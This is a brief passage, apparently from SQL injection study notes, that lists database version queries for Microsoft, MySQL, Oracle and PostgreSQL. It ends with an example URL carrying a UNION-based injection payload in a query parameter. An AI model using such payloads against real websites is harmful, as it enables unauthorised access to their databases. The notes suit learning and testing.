@@ -1,0 +1,9 @@
+1. Querying the database type and version
+The query to get the database type and version depends on the database type.  See the queries below:
+
+Microsoft, MySQL: SELECT @@version
+Oracle: SELECT * FROM v$version
+PostgreSQL: SELECT version()
+
+So a query to get the database version from an MySQL database could look like this:
+https://www.website.com/products?category=Category1'+UNION+SELECT+@@version--
